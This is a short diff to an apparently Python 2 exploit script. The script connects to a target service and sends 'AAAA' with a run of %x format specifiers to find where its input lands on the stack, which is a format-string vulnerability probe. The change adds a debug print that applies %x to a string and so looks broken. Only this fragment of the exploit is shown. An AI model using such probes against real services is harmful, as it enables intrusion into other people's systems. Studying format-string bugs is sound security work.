@@ -40,6 +40,8 @@ s.connect((sys.argv[1], int(sys.argv[2])))
 s.send("AAAA %x %x %x %x %x %x %x %x %x %x %x %x\n")
 line = readLine(s)
 
+print "%x" %line
+
 vals = line.split()
 buf_start = vals.index('41414141')
 print "buffer starts at %d" % buf_start
